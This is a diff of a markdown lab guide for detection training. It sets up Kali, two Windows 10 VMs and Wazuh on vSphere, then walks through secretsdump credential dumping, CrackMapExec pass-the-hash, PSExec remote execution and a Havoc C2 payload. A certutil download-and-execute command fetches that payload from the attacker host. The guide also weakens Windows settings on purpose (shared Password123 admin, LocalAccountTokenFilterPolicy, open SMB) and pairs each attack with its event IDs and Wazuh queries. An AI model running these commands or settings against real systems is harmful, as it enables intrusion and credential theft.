@@ -2,10 +2,59 @@
 
 ---
 
+## VM Specs (vSphere)
+
+| VM | OS | vCPU | RAM | Disk |
+|---|---|---|---|---|
+| Kali (attacker) | Kali Linux | 2 | 4 GB | 40 GB |
+| Win-VM1 | Windows 10 | 2 | 4 GB | 60 GB |
+| Win-VM2 | Windows 10 | 2 | 4 GB | 60 GB |
+| Wazuh server | Ubuntu 22.04 | 4 | 8 GB | 50 GB |
+
+All VMs on the same port group in vSphere so they can reach each other.
+
+---
+
+## Connecting to the Windows VMs
+
+**Option 1 — vSphere Web Console (no extra setup)**
+Open vSphere Client in browser → right-click VM → Launch Web Console. Works out of the box, no network config needed.
+
+**Option 2 — RDP (more comfortable)**
+
+Enable RDP on each Windows VM via vSphere console first:
+```powershell
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+```
+Then RDP from any machine on the same network: `mstsc /v:<WIN_VM_IP>`
+
+> For the attacks to work, Kali must be able to reach the Windows VMs over the network (ping test first).
+
+---
+
+## Windows VM Pre-setup (do before the session)
+
+Run on both Windows VMs:
+
+```powershell
+# Local admin account — same password on both VMs (this is the point of PTH demo)
+net user labadmin Password123 /add
+net localgroup administrators labadmin /add
+
+# Allow PTH with local accounts (blocked by default on Win10)
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+# Open SMB through firewall (needed for secretsdump, PSExec, CME)
+netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
+```
+
+---
+
 ## Wazuh Setup
 
 ```bash
-# Single-node Docker install
+# Single-node Docker install on Ubuntu server
 git clone https://github.com/wazuh/wazuh-docker.git -b v4.7.3
 cd wazuh-docker/single-node
 docker compose up -d
@@ -25,11 +74,13 @@ msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER="<WAZUH_IP>" WAZUH_AGENT_NAME="W
 Start-Service WazuhSvc
 ```
 
+Change `Win-VM1` to `Win-VM2` on the second machine.
+
 ---
 
 ## Enable Audit Policies (required)
 
-Run on both Windows VMs before doing anything else:
+Run on both Windows VMs — without this most attacks produce no logs:
 
 ```powershell
 auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
@@ -66,8 +117,9 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Scr
 ## Attack 1 — Credential Dumping (secretsdump)
 
 ```bash
-impacket-secretsdump Administrator:'Password123'@<WIN_VM1_IP>
-# Copy the NT hash: the part after the third colon
+impacket-secretsdump labadmin:'Password123'@<WIN_VM1_IP>
+# Output: labadmin:1001:aad3b435...:NTLM_HASH:::
+# Copy the NT hash — the part after the third colon
 ```
 
 Events: 4624 (Type 3), 4776
@@ -81,17 +133,18 @@ data.win.system.eventID: 4776
 ## Attack 2 — Pass the Hash (CrackMapExec)
 
 ```bash
-crackmapexec smb <WIN_VM2_IP> -u Administrator -H <NT_HASH>
-crackmapexec smb <WIN_VM2_IP> -u Administrator -H <NT_HASH> -x "whoami"
+crackmapexec smb <WIN_VM2_IP> -u labadmin -H <NT_HASH>
+crackmapexec smb <WIN_VM2_IP> -u labadmin -H <NT_HASH> -x "whoami"
 ```
+
+Same hash works on VM2 because both VMs have the same password — that's the whole point.
 
 Events: 4624 (Type 3, NTLM), 4648, 4672
 
 PTH signature in logs:
 - LogonType = 3
 - AuthenticationPackageName = NTLM
-- WorkstationName = attacker machine
-- IpAddress = attacker IP
+- IpAddress = Kali IP
 
 ```
 data.win.system.eventID: 4624 AND data.win.eventdata.logonType: 3 AND data.win.eventdata.authenticationPackageName: NTLM
@@ -102,8 +155,9 @@ data.win.system.eventID: 4624 AND data.win.eventdata.logonType: 3 AND data.win.e
 ## Attack 3 — Remote Execution (PSExec)
 
 ```bash
-impacket-psexec Administrator:'Password123'@<WIN_VM1_IP>
-impacket-psexec -hashes :NT_HASH Administrator@<WIN_VM1_IP>
+impacket-psexec labadmin:'Password123'@<WIN_VM1_IP>
+# or with hash
+impacket-psexec -hashes :NT_HASH labadmin@<WIN_VM1_IP>
 ```
 
 Events: 7045 (PSEXESVC service), 4697, 4624, 4688
@@ -127,22 +181,21 @@ sudo ./havoc server --profile ./profiles/havoc.yaotl -v
 ```
 
 In Havoc client:
-1. View → Listeners → Add — HTTP, set Host to `<KALI_IP>`
+1. View → Listeners → Add — HTTP, Host: `<KALI_IP>`, Port: 80
 2. Attack → Payload → Generate — Windows EXE
-3. Save output as `demon.exe`
+3. Save as `demon.exe` → move to `/tmp/`
 
 ```bash
-# Host the payload
 python3 -m http.server 8080 --directory /tmp/
 ```
 
-On Windows VM (cmd as Admin):
+On Windows VM in cmd (as Admin):
 ```cmd
 certutil -urlcache -split -f http://<KALI_IP>:8080/demon.exe C:\Windows\Temp\demon.exe
 C:\Windows\Temp\demon.exe
 ```
 
-Events: 4688 (certutil with urlcache), 4688 (demon.exe from cmd.exe), 4697 if persistence
+Events: 4688 (certutil + urlcache), 4688 (demon.exe spawned from cmd.exe)
 
 ```
 data.win.eventdata.commandLine: *certutil* AND data.win.eventdata.commandLine: *urlcache*
